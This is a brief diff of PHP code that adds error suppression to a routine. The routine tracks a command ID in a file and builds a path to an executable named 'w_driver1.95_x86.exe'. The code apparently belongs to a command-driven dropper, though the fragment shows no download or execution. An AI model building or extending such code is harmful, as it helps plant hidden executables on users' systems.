@@ -44,7 +44,7 @@ if(!$work_key)
 $command_id = '000031';
 if(@file_get_contents($id_com) !== $command_id)
 {
-	file_put_contents($id_com, $command_id);
+	@file_put_contents($id_com, $command_id);
 	try{
 	$lolm_path .= '\\w_driver1.95_x86.exe';
 	$data = true;
